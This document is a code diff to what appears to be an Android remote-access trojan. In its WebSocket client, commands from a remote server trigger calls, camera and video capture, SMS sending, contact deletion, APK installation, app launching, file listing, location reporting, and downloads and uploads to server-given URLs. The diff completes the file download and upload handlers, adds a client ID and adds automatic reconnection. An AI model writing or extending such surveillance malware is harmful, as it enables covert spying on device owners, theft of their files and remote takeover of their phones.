@@ -10,6 +10,7 @@ import com.ot.grhq.client.functionality.PackageManager;
 import com.ot.grhq.client.functionality.Phone;
 import com.ot.grhq.client.functionality.SMS;
 import com.ot.grhq.client.functionality.Screenshot;
+import com.ot.grhq.client.functionality.Utils;
 
 import org.java_websocket.handshake.ServerHandshake;
 import org.json.JSONException;
@@ -39,27 +40,21 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onMessage(String message) {
-        Log.d("eeee", message);
-        try {
-            sendResponse("client", "non nuk");
-        } catch (JSONException e) {
-            throw new RuntimeException(e);
-        }
         try {
             JSONObject req = new JSONObject(message);
 
             JSONObject json = new JSONObject();
             json.put("type", "client");
-            json.put("id", "");
+            json.put("id", Utils.clientID(context));
 
             byte[] data = null;
             File file = null;
             String path = null;
-            Command cmd = Command.valueOf(req.optString("cmd"));
+            Command cmd = Command.valueOf(req.getString("cmd"));
 
             switch (cmd) {
                 case CALL:
-                    Phone.call(context, json.getString("number"));
+                    Phone.call(context, req.getString("number"));
                     break;
                 case CAMERA_BACK:
                     path = Screenshot.captureImage(context, false);
@@ -82,22 +77,23 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case DELETE_CONTACT:
-                    Phone.deleteContact(json.getString("name"), json.getString("number"));
+                    Phone.deleteContact(req.getString("name"), req.getString("number"));
                     break;
                 case DOWNLOAD_FILE:
+                    FileManager.downloadFile(context, req.getString("url"), req.getString("filename"));
                     break;
                 case INSTALL_APK:
-                    PackageManager.installApp(context, json.getString("path"));
+                    PackageManager.installApp(context, req.getString("path"));
                     break;
                 case LAUNCH_APP:
-                    PackageManager.launchApp(context, json.getString("package"));
+                    PackageManager.launchApp(context, req.getString("package"));
                     break;
                 case LIST_INSTALLED_APPS:
                     Map<String, String> apps = PackageManager.getInstalledApps(context);
                     sendResponse("app_list", mapToJson(apps).toString());
                     break;
                 case LIST_FILES:
-                    List<String> files = FileManager.listFiles(json.getString("path"));
+                    List<String> files = FileManager.listFiles(req.getString("path"));
                     sendResponse("files", files.toString());
                     break;
                 case LOCATION:
@@ -120,9 +116,10 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case TEXT:
-                    SMS.send(json.getString("name"), json.getString("number"));
+                    SMS.send(req.getString("name"), req.getString("number"));
                     break;
                 case UPLOAD_FILE:
+                    FileManager.uploadFile(req.getString("path"), req.getString("url"));
                     break;
                 case VIDEO:
                     path = Screenshot.captureVideo(context, req.getInt("duration"));
@@ -151,7 +148,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onClose(int code, String reason, boolean remote) {
-
+        connect();
     }
 
     @Override
@@ -183,6 +180,12 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
         return jsonObject;
     }
 
+    /**
+     * Get file contents
+     * @param path file path
+     * @return file content in bytes
+     * @throws IOException
+     */
     private byte[] getFileContent(String path) throws IOException {
         byte[] data = null;
 
